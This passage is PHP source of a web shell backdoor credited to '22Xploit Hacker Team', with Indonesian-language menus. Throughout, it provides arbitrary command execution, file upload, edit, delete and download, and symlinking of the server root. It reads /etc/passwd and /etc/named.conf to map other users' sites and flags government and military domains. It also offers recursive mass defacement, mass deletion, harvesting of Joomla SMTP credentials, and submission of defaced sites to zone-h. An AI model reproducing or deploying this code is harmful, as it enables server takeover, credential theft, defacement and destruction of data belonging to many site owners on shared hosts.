	echo "<center><textarea disabled='disabled'>Shell Ini Tidak Sepenuhnya Di Buat 100% No Recode Hanya Tools Yang Kami Recode Untuk Kami Masukkan Ke Shell Backdoor Ini, Tapi Juga Tidak Semua Tools Kami Recode Ini 100%, Hanya Sebagian Tools, Thank's For All Member 22Xploiter Crew Yang Telah Membantu Proses Pembuatan Shell Ini:)";
	echo "</textarea></center>";
}elseif($_GET['XploiterCrew'] == 'lapor'){
	@mkdir('shu',0777);
$htaccess  = "Options all \n DirectoryIndex Sux.html \n AddType text/plain .php \n AddHandler server-parsed .php \n  AddType text/plain .html \n AddHandler txt .html \n Require None \n Satisfy Any";
$write =@fopen ('shu/.htaccess','w');
fwrite($write ,$htaccess);
@symlink('/','shu/root');
$filelocation = basename(__FILE__);
$read_named_conf = @file('/etc/named.conf');
if(!$read_named_conf)
{
echo "<pre class=ml1 style='margin-top:5px'># Tidak Bisa Mengakses File => [ /etc/named.conf ]</pre></center>"; 
}
else
{
echo "<br><br><div class='tmp'><table border='1' bordercolor='#00ff00' width='500' cellpadding='1' cellspacing='0'><td>Domains</td><td>Users</td><td>symlink </td>";
foreach($read_named_conf as $subject){
if(eregi('zone',$subject)){
preg_match_all('#zone "(.*)"#',$subject,$string);
flush();
if(strlen(trim($string[1][0])) >2){
$UID = posix_getpwuid(@fileowner('/etc/valiases/'.$string[1][0]));
$name = $UID['name'] ;
@symlink('/','nginx1337/root');
$name   = $string[1][0];
$iran   = '\.ir';
$israel = '\.il';
$indo   = '\.id';
$sg12   = '\.sg';
$edu    = '\.edu';
$gov    = '\.gov';
$gose   = '\.go';
$gober  = '\.gob';
$mil1   = '\.mil';
$mil2   = '\.mi';
$malay	= '\.my';
$china	= '\.cn';
$japan	= '\.jp';
$austr	= '\.au';
$porn	= '\.xxx';
$as		= '\.uk';
$calfn	= '\.ca';

if (eregi("$iran",$string[1][0]) or eregi("$israel",$string[1][0]) or eregi("$indo",$string[1][0])or eregi("$sg12",$string[1][0]) or eregi ("$edu",$string[1][0]) or eregi ("$gov",$string[1][0])
or eregi ("$gose",$string[1][0]) or eregi("$gober",$string[1][0]) or eregi("$mil1",$string[1][0]) or eregi ("$mil2",$string[1][0])
or eregi ("$malay",$string[1][0]) or eregi("$china",$string[1][0]) or eregi("$japan",$string[1][0]) or eregi ("$austr",$string[1][0])
or eregi("$porn",$string[1][0]) or eregi("$as",$string[1][0]) or eregi ("$calfn",$string[1][0]))
{
$name = "<div style=' color: #FF0000 ; text-shadow: 0px 0px 1px red; '>".$string[1][0].'</div>';
}
echo "
<tr>

<td>
<div class='dom'><a target='_blank' href=http://".$string[1][0].'/>'.$name.' </a> </div>
</td>

<td>
'.$UID['name']."
</td>

<td>
<a href='nginx1337/root/home/".$UID['name']."/public_html' target='_blank'>Symlink </a>
</td>

</tr></div> ";
flush();
}
}
}
}

echo "</center></table>";   


}elseif($_GET['XploiterCrew'] == 'upload') {
	echo "<center>";
	if($_POST['upload']) {
		if(@copy($_FILES['ix_file']['tmp_name'], "$dir/".$_FILES['ix_file']['name']."")) {
			$act = "<font color='red' size='1'>SUCCES => </font><i>$dir/".$_FILES['ix_file']['name']."<i>";
		} else {
			$act = "<font color='blue' size='1'>Pilih Filenya Dulu Goblok!</font>";
		}
	}
	echo "<form method='post' enctype='multipart/form-data'><input type='file' name='ix_file'><input type='submit' value='upload' name='upload'></form>";
	echo $act;
	echo "</center>";
} elseif($_GET['XploiterCrew'] == 'cmd') {
	echo "<form method='post'>
	<font style='text-decoration: underline;'>".$user."@".gethostbyname($_SERVER['HTTP_HOST']).":~# </font>
	<input type='text' size='30' height='10' name='cmd'><input type='submit' name='do_cmd' value='>>'>
	</form>";
	if($_POST['do_cmd']) {
		echo "<pre>".exe($_POST['cmd'])."</pre>";
	}
} elseif($_GET['XploiterCrew'] == 'mass_deface') {
	function sabun_massal($dir,$namafile,$isi_script) {
		if(is_writable($dir)) {
			$dira = scandir($dir);
			foreach($dira as $dirb) {
				$dirc = "$dir/$dirb";
				$lokasi = $dirc.'/'.$namafile;
				if($dirb === '.') {
					file_put_contents($lokasi, $isi_script);
				} elseif($dirb === '..') {
					file_put_contents($lokasi, $isi_script);
				} else {
					if(is_dir($dirc)) {
						if(is_writable($dirc)) {
							echo "</center><div class=bantal>[<font color=orange size=2>SUCCES</font>]<br><font color=lime size=2> $lokasi</font><br>";
							file_put_contents($lokasi, $isi_script);
							$ixs = sabun_massal($dirc,$namafile,$isi_script);
							echo "</div>";
						}
					}
				}
			}
		}
	}
	if($_POST['start']) {
		echo "<div style='margin: 5px auto; padding: 5px'>";
		sabun_massal($_POST['d_dir'], $_POST['d_file'], $_POST['script']);
		echo "</div>";
	} else {
	echo "<center>";
	echo "<form method='post'>
	<font style='text-decoration: underline;'>Folder</font><br>
	<input type='text' name='d_dir' value='$dir' style='width: 450px;' height='10'><br>
	<font style='text-decoration: underline;'>File</font><br>
	<input type='text' name='d_file' value='index.php' style='width: 450px;' height='10'><br>
	<font style='text-decoration: underline;'>File Index</font><br>
	<textarea name='script' style='width: 450px; height: 200px;'><script>alert('Patch By 22Xploit Hacker Team')</script></textarea><br>
	<input type='submit' name='start' value='Deface' style='width: 450px;'>
	</form></center>";
	}
}elseif($_GET['XploiterCrew'] == 'smtp') {
	echo "<center>";
	function scj($dir) {
		$dira = scandir($dir);
		foreach($dira as $dirb) {
			if(!is_file("$dir/$dirb")) continue;
			$ambil = file_get_contents("$dir/$dirb");
			$ambil = str_replace("$", "", $ambil);
			if(preg_match("/JConfig|joomla/", $ambil)) {
				$smtp_host = ambilkata($ambil,"smtphost = '","'");
				$smtp_auth = ambilkata($ambil,"smtpauth = '","'");
				$smtp_user = ambilkata($ambil,"smtpuser = '","'");
				$smtp_pass = ambilkata($ambil,"smtppass = '","'");
				$smtp_port = ambilkata($ambil,"smtpport = '","'");
				$smtp_secure = ambilkata($ambil,"smtpsecure = '","'");
				echo "SMTP Host: <font color=lime>$smtp_host</font><br>";
				echo "SMTP port: <font color=lime>$smtp_port</font><br>";
				echo "SMTP user: <font color=lime>$smtp_user</font><br>";
				echo "SMTP pass: <font color=lime>$smtp_pass</font><br>";
				echo "SMTP auth: <font color=lime>$smtp_auth</font><br>";
				echo "SMTP secure: <font color=lime>$smtp_secure</font><br><br>";
			}
		}
	}
	$smpt_hunter = scj($dir);
	echo $smpt_hunter;
} elseif($_GET['XploiterCrew'] == 'mass_delete') {
	function hapus_massal($dir,$namafile) {
		if(is_writable($dir)) {
			$dira = scandir($dir);
			foreach($dira as $dirb) {
				$dirc = "$dir/$dirb";
				$lokasi = $dirc.'/'.$namafile;
				if($dirb === '.') {
					if(file_exists("$dir/$namafile")) {
						unlink("$dir/$namafile");
					}
				} elseif($dirb === '..') {
					if(file_exists("".dirname($dir)."/$namafile")) {
						unlink("".dirname($dir)."/$namafile");
					}
				} else {
					if(is_dir($dirc)) {
						if(is_writable($dirc)) {
							if(file_exists($lokasi)) {
								echo "</center><table><th>Sukses</th> <td>$lokasi</td></table>";
								unlink($lokasi);
								$ixs = hapus_massal($dirc,$namafile);
							}
						}
					}
				}
			}
		}
	}
	if($_POST['start']) {
		echo "<div style='margin: 5px auto; padding: 5px'>";
		hapus_massal($_POST['d_dir'], $_POST['d_file']);
		echo "</div>";
	} else {
	echo "<center>";
	echo "<form method='post'>
	<font style='text-decoration: underline;'>Folder</font><br>
	<input type='text' name='d_dir' value='$dir' style='width: 450px;' height='10'><br>
	<font style='text-decoration: underline;'>File</font><br>
	<input type='text' name='d_file' value='index.php' style='width: 450px;' height='10'><br>
	<input type='submit' name='start' value='Hapus' style='width: 450px;'>
	</form></center>";
	}
}elseif($_GET['XploiterCrew'] == 'jumping') {
	$i = 0;
	echo "<pre><div class='margin: 5px auto;'>";
	$etc = fopen("/etc/passwd", "r");
	while($passwd = fgets($etc)) {
		if($passwd == '' || !$etc) {
			echo "<font color=red>Tidak Bisa Membaca /etc/passwd Asu</font>";
		} else {
			preg_match_all('/(.*?):x:/', $passwd, $user_jumping);
			foreach($user_jumping[1] as $user_ixs_jump) {
				$user_jumping_dir = "/home/$user_ixs_jump/public_html";
				if(is_readable($user_jumping_dir)) {
					$i++;
					$jrw = "[<font color=lime>R</font>] <a href='?dir=$user_jumping_dir'><font color=gold>$user_jumping_dir</font></a>";
					if(is_writable($user_jumping_dir)) {
						$jrw = "[<font color=lime>RW</font>] <a href='?dir=$user_jumping_dir'><font color=gold>$user_jumping_dir</font></a>";
					}
					echo $jrw;
					$domain_jump = file_get_contents("/etc/named.conf");	
					if($domain_jump == '') {
						echo " => ( <font color=red>Ga Bisa Ambil Nama Domain</font> )<br>";
					} else {
						preg_match_all("#/var/named/(.*?).db#", $domain_jump, $domains_jump);
						foreach($domains_jump[1] as $dj) {
							$user_jumping_url = posix_getpwuid(@fileowner("/etc/valiases/$dj"));
							$user_jumping_url = $user_jumping_url['name'];
							if($user_jumping_url == $user_ixs_jump) {
								echo " => ( <u>$dj</u> )<br>";
								break;
							}
						}
					}
				}
			}
		}
	}
	if($i == 0) { 
	} 
		
} elseif($_GET['XploiterCrew'] == 'zoneh') {
	if($_POST['submit']) {
		$domain = explode("\r\n", $_POST['url']);
		$nick =  $_POST['nick'];
		echo "<font size=1>Defacer Onhold: <a href='http://www.zone-h.org/archive/notifier=$nick/published=0' target='_blank'>http://www.zone-h.org/archive/notifier=$nick/published=0</a><br>";
		echo "Defacer Archive: <a href='http://www.zone-h.org/archive/notifier=$nick' target='_blank'>http://www.zone-h.org/archive/notifier=$nick</a><br><br>";
		function zoneh($url,$nick) {
			$ch = curl_init("http://www.zone-h.com/notify/single");
				  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
				  curl_setopt($ch, CURLOPT_POST, true);
				  curl_setopt($ch, CURLOPT_POSTFIELDS, "defacer=$nick&domain1=$url&hackmode=1&reason=1&submit=Send");
			return curl_exec($ch);
				  curl_close($ch);
		}
		foreach($domain as $url) {
			$zoneh = zoneh($url,$nick);
			if(preg_match("/color=\"red\">SUCCES<\/font><\/li>/i", $zoneh)) {
				echo "$url -> <font color=green>SUCCES</font><br>";
			} else {
				echo "$url -> <font color=red>ERROR</font><br></font>";
			}
		}
	} else {
		echo "<center><form method='post'>
		<u>Nama Defacer</u><br>
		<input type='text' name='nick' size='50' value='22XploiterCrew'><br>
		<u>Domains</u><br>
		<textarea style='width: 450px; height: 100px;' name='url'></textarea><br>
		<input type='submit' name='submit' value='Submit' style='width: 450px;'>
		</form>";
	}
	echo "</center>";
} elseif($_GET['act'] == 'newfile') {
	if($_POST['new_save_file']) {
		$newfile = htmlspecialchars($_POST['newfile']);
		$fopen = fopen($newfile, "a+");
		if($fopen) {
			$act = "<script>window.location='?act=edit&dir=".$dir."&file=".$_POST['newfile']."';</script>";
		} else {
			$act = "<font color=red>Permission Denied</font>";
		}
	}
	echo $act;
	echo "<form method='post'>
	Nama File: <input type='text' name='newfile' value='$dir/newfile.php' style='width: 450px;' height='10'>
	<input type='submit' name='new_save_file' value='Submit'>
	</form>";
} elseif($_GET['act'] == 'newfolder') {
	if($_POST['new_save_folder']) {
		$new_folder = $dir.'/'.htmlspecialchars($_POST['newfolder']);
		if(!mkdir($new_folder)) {
			$act = "<font color=red>Permission Denied</font>";
		} else {
			$act = "<script>window.location='?dir=".$dir."';</script>";
		}
	}
	echo $act;
	echo "<form method='post'>
	Nama Folder: <input type='text' name='newfolder' style='width: 450px;' height='10'>
	<input type='submit' name='new_save_folder' value='Submit'>
	</form>";
} elseif($_GET['act'] == 'rename_dir') {
	if($_POST['dir_rename']) {
		$dir_rename = rename($dir, "".dirname($dir)."/".htmlspecialchars($_POST['fol_rename'])."");
		if($dir_rename) {
			$act = "<script>window.location='?dir=".dirname($dir)."';</script>";
		} else {
			$act = "<font color=red>Permission Denied</font>";
		}
	echo "".$act."<br>";
	}
	echo "<form method='post'>
	<input type='text' value='".basename($dir)."' name='fol_rename' style='width: 450px;' height='10'>
	<input type='submit' name='dir_rename' value='rename'>
	</form>";
} elseif($_GET['act'] == 'delete_dir') {
	$delete_dir = rmdir($dir);
	if($delete_dir) {
		$act = "<script>window.location='?dir=".dirname($dir)."';</script>";
	} else {
		$act = "<font color=red>could not remove ".basename($dir)."</font>";
	}
	echo $act;
} elseif($_GET['act'] == 'view') {
	echo "Nama File: <font color=lime>".basename($_GET['file'])."<br></font>[ <a href='?act=edit&dir=$dir&file=".$_GET['file']."'>edit</a> ] [ <a href='?act=rename&dir=$dir&file=".$_GET['file']."'>Ubah Nama</a> ] [ <a href='?act=download&dir=$dir&file=".$_GET['file']."'>Download</a> ] [ <a href='?act=delete&dir=$dir&file=".$_GET['file']."'>Hapus</a> ]<br>";
	echo "<textarea readonly>".htmlspecialchars(@file_get_contents($_GET['file']))."</textarea>";
} elseif($_GET['act'] == 'edit') {
	if($_POST['save']) {
		$save = file_put_contents($_GET['file'], $_POST['src']);
		if($save) {
			$act = "<font color=green>Tersimpan</font>";
		} else {
			$act = "<font color=red>Permission Denied</font>";
		}
	echo "".$act."<br>";
	}
	echo "<font color=aqua size=1>Nama File:</font><font color=green size=1> ".basename($_GET['file'])."</font><font color=red size=1> [ <a href='?act=view&dir=$dir&file=".$_GET['file']."'>Lihat</a> ] [ <a href='?act=edit&dir=$dir&file=".$_GET['file']."'>Edit</b></a> ] [ <a href='?act=rename&dir=$dir&file=".$_GET['file']."'>Ubah Nama</a> ] [ <a href='?act=download&dir=$dir&file=".$_GET['file']."'>Unduh</a> ] [ <a href='?act=delete&dir=$dir&file=".$_GET['file']."'>Hapus</a> ]<br></font>";
	echo "<form method='post'>
	<textarea name='src'>".htmlspecialchars(@file_get_contents($_GET['file']))."</textarea><br>
	<input type='submit' value='Simpan' name='save' style='width: 500px;'>
	</form>";
} elseif($_GET['act'] == 'rename') {
	if($_POST['do_rename']) {
		$rename = rename($_GET['file'], "$dir/".htmlspecialchars($_POST['rename'])."");
		if($rename) {
			$act = "<script>window.location='?dir=".$dir."';</script>";
		} else {
			$act = "<font color=red>Permission Denied</font>";
		}
	echo "".$act."<br>";
	}
	echo "<font color=aqua size=1>Nama File: </font><font color=green size=1>".basename($_GET['file'])." [ <a href='?act=view&dir=$dir&file=".$_GET['file']."'>Lihat</a> ] [ <a href='?act=edit&dir=$dir&file=".$_GET['file']."'>Edit</a> ] [ <a href='?act=rename&dir=$dir&file=".$_GET['file']."'>Ubah Nama</b></a> ] [ <a href='?act=download&dir=$dir&file=".$_GET['file']."'>Unduh</a> ] [ <a href='?act=delete&dir=$dir&file=".$_GET['file']."'>Hapus</a> ]<br></font>";
	echo "<form method='post'>
	<input type='text' value='".basename($_GET['file'])."' name='rename' style='width: 450px;' height='10'>
	<input type='submit' name='do_rename' value='rename'>
	</form>";
} elseif($_GET['act'] == 'delete') {
	$delete = unlink($_GET['file']);
	if($delete) {
		$act = "<script>window.location='?dir=".$dir."';</script>";
	} else {
		$act = "<font color=red>Permission Denied</font>";
	}
	echo $act;
} elseif(isset($_GET['file']) && ($_GET['file'] != '') && ($_GET['act'] == 'download')) {
	@ob_clean();
	$file = $_GET['file'];
	header('Content-Description: File Transfer');
	header('Content-Type: application/octet-stream');
	header('Content-Disposition: attachment; Nama File="'.basename($file).'"');
	header('Expires: 0');
	header('Cache-Control: must-revalidate');
	header('Pragma: public');
	header('Content-Length: ' . filesize($file));
	readfile($file);
	exit;
} else {
	if(is_dir($dir) == true) {
		echo '<table width="100%" class="table_home" border="0" cellpadding="3" cellspacing="1" align="center">
		<tr>
		<th class="th_home"><center>Nama</center></th>
		<th class="th_home"><center>Tipe</center></th>
		<th class="th_home"><center>Ukuran</center></th>
		<th class="th_home"><center>Terakhir Dimodidikasi</center></th>
		<th class="th_home"><center>Permission</center></th>
		<th class="th_home"><center>Aksi</center></th>
		</tr>';
		$scandir = scandir($dir);
		foreach($scandir as $dirx) {
			$dtype = filetype("$dir/$dirx");
			$dtime = date("F d Y g:i:s", filemtime("$dir/$dirx"));
 			if(!is_dir("$dir/$dirx")) continue;
 			if($dirx === '..') {
 				$href = "<a href='?dir=".dirname($dir)."'>$dirx</a>";
 			} elseif($dirx === '.') {
 				$href = "<a href='?dir=$dir'>$dirx</a>";
 			} else {
 				$href = "<a href='?dir=$dir/$dirx'>$dirx</a>";
 			}
 			if($dirx === '.' || $dirx === '..') {
 				$act_dir = "<a href='?act=newfile&dir=$dir'>File Baru</a> | <a href='?act=newfolder&dir=$dir'>Folder Baru</a>";
 				} else {
 				$act_dir = "<a href='?act=rename_dir&dir=$dir/$dirx'>Ubah Nama</a> | <a href='?act=delete_dir&dir=$dir/$dirx'>Hapus</a>";
 			}
 			echo "<tr>";
 			echo "<td class='td_home'><img src='data:image/png;base64,R0lGODlhEwAQALMAAAAAAP///5ycAM7OY///nP//zv/OnPf39////wAAAAAAAAAAAAAAAAAAAAAA"."AAAAACH5BAEAAAgALAAAAAATABAAAARREMlJq7046yp6BxsiHEVBEAKYCUPrDp7HlXRdEoMqCebp"."/4YchffzGQhH4YRYPB2DOlHPiKwqd1Pq8yrVVg3QYeH5RYK5rJfaFUUA3vB4fBIBADs='>$href</td>";
			echo "<td class='td_home'><center>$dtype</center></td>";
			echo "<td class='td_home'><center>-</center></th>";
			echo "<td class='td_home'><center>$dtime</center></td>";
			echo "<td class='td_home'><center>".w("$dir/$dirx",perms("$dir/$dirx"))."</center></td>";
			echo "<td class='td_home' style='padding-left: 15px;'>$act_dir</td>";
		}
		echo "</tr>";
		foreach($scandir as $file) {
			$ftype = filetype("$dir/$file");
			$ftime = date("F d Y g:i:s", filemtime("$dir/$file"));
			$size = filesize("$dir/$file")/1024;
			$size = round($size,3);
			if($size > 1024) {
				$size = round($size/1024,2). 'MB';
			} else {
				$size = $size. 'KB';
			}
			if(!is_file("$dir/$file")) continue;
			echo "<tr>";
			echo "<td class='td_home'><img src='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAAXNSR0IArs4c6QAAAAZiS0dEAP8A/wD/oL2nkwAAAAlwSFlzAAALEwAACxMBAJqcGAAAAAd0SU1FB9oJBhcTJv2B2d4AAAJMSURBVDjLbZO9ThxZEIW/qlvdtM38BNgJQmQgJGd+A/MQBLwGjiwH3nwdkSLtO2xERG5LqxXRSIR2YDfD4GkGM0P3rb4b9PAz0l7pSlWlW0fnnLolAIPB4PXh4eFunucAIILwdESeZyAifnp6+u9oNLo3gM3NzTdHR+//zvJMzSyJKKodiIg8AXaxeIz1bDZ7MxqNftgSURDWy7LUnZ0dYmxAFAVElI6AECygIsQQsizLBOABADOjKApqh7u7GoCUWiwYbetoUHrrPcwCqoF2KUeXLzEzBv0+uQmSHMEZ9F6SZcr6i4IsBOa/b7HQMaHtIAwgLdHalDA1ev0eQbSjrErQwJpqF4eAx/hoqD132mMkJri5uSOlFhEhpUQIiojwamODNsljfUWCqpLnOaaCSKJtnaBCsZYjAllmXI4vaeoaVX0cbSdhmUR3zAKvNjY6Vioo0tWzgEonKbW+KkGWt3Unt0CeGfJs9g+UU0rEGHH/Hw/MjH6/T+POdFoRNKChM22xmOPespjPGQ6HpNQ27t6sACDSNanyoljDLEdVaFOLe8ZkUjK5ukq3t79lPC7/ODk5Ga+Y6O5MqymNw3V1y3hyzfX0hqvJLybXFd++f2d3d0dms+qvg4ODz8fHx0/Lsbe3964sS7+4uEjunpqmSe6e3D3N5/N0WZbtly9f09nZ2Z/b29v2fLEevvK9qv7c2toKi8UiiQiqHbm6riW6a13fn+zv73+oqorhcLgKUFXVP+fn52+Lonj8ILJ0P8ZICCF9/PTpClhpBvgPeloL9U55NIAAAAAASUVORK5CYII='><a href='?act=view&dir=$dir&file=$dir/$file'>$file</a></td>";
			echo "<td class='td_home'><center>$ftype</center></td>";
			echo "<td class='td_home'><center>$size</center></td>";
			echo "<td class='td_home'><center>$ftime</center></td>";
			echo "<td class='td_home'><center>".w("$dir/$file",perms("$dir/$file"))."</center></td>";
			echo "<td class='td_home' style='padding-left: 15px;'><a href='?act=edit&dir=$dir&file=$dir/$file'>Edit</a> | <a href='?act=rename&dir=$dir&file=$dir/$file'>Ubah Nama</a> | <a href='?act=delete&dir=$dir&file=$dir/$file'>Hapus</a> | <a href='?act=download&dir=$dir&file=$dir/$file'>Unduh(BackUp)</a></td>";
		}
		echo "</tr></table><hr>";
	} else {
		echo "<font color=red>Tidak Bisa Membaca Direktori</font>";
	}
	echo "<center>Copyright &copy; ".date("Y")." - <a href='http://forum.indoxploit.or.id/' target='_blank'><font color=gold>22Xploit Hacker Team</font></a> | <font color='lime'>Created By Mr.R4ND5 And All Member 22Xploit</center>";
}
?>
</html>